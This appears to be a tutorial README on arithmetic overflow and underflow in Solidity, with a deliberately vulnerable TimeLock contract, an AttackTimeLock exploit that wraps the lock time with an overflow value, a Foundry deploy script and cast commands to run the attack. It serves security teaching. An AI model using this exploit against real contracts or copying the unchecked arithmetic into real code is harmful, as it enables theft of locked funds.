# Web3eg-Smart-Contract-Auditor-Arithmetic-Overflows-and-Underflows
- Arithmetic overflows and underflows are common issues in programming, especially in low-level languages like Solidity (used for Ethereum smart contracts).
-  They occur when the result of an arithmetic operation exceeds the maximum or minimum value that can be stored in a given data type.

![Static Badge](https://img.shields.io/badge/%20Arithmetic%20Overflow-Green)

```solidity
uint8 x = 255; // uint8 can store values from 0 to 255
x = x + 1;     // 255 + 1 = 256, which overflows
```
![Static Badge](https://img.shields.io/badge/Arithmetic%20Underflow-Green)

```solidity
uint8 x = 0; // uint8 can store values from 0 to 255
x = x - 1;   // 0 - 1 = -1, which underflows
```
![Static Badge](https://img.shields.io/badge/Example1-Green)

TimeLock.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

contract TimeLock {
    mapping (address => uint) public balances;
    mapping(address => uint) public lockTime;

    function depositEth() public payable{
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 30 days;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function  withdrawEth() public{
        require(balances[msg.sender]>0 ,"Insufficient balance");
        require(block.timestamp>lockTime[msg.sender],"Lock time not expired");
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool sent,)= msg.sender.call{value:amount}("");
        require(sent,"Failed to send Ether");

    } 
   
    }
```
AttackTimeLock.sol
```solidity
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

interface ITimeLock{
    function depositEth() external payable;
    function increaseLockTime(uint256 _secondsToIncrease ) external;
    function withdrawEth() external;  
}

contract AttackTimeLock {

    ITimeLock public timeLock;

    constructor (address _timeLock){
        timeLock = ITimeLock(_timeLock);

    }

    function deposit() public payable{
        timeLock.depositEth{value: msg.value}();
    }
    function exploit() external{
        uint256 overFlowValue = type(uint256).max - block.timestamp + 1;
        timeLock.increaseLockTime(overFlowValue);
    }

    function withdraw () public{
        timeLock.withdrawEth();
    }

    receive() external payable {
}
}
```
DeployAttackTimeLock.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {Script, console} from "forge-std/Script.sol";
import {TimeLock} from "../src/TimeLock.sol";
import{AttackTimeLock} from "../src/AttackTimeLock.sol";

contract DeployAttackTimeLock is Script {

    function run() public {
        uint256 TimeLockKey = vm.envUint("PRIVATE_KEY1");
        uint256 AttackTimeLockKey = vm.envUint("PRIVATE_KEY2");

        vm.startBroadcast(TimeLockKey);
        TimeLock timeLock = new TimeLock();
        vm.stopBroadcast();

        vm.startBroadcast(AttackTimeLockKey);
        AttackTimeLock attackTimeLock = new AttackTimeLock(address(timeLock));
        console.log("TimeLock deployed at:", address(timeLock));
        console.log("Attacker deployed at:", address(attackTimeLock));

        vm.stopBroadcast();
    }
}
```
- Deposit 
```cast send <Attacker_Address> "deposit()" --value 1ether --private-key $PRIVATE_KEY_2```
- Exploit
```cast send <Attacker_Address> "exploit()" --private-key $PRIVATE_KEY_2```
- Withdraw
```cast send <Attacker_Address> "withdraw()" --private-key $PRIVATE_KEY_2```




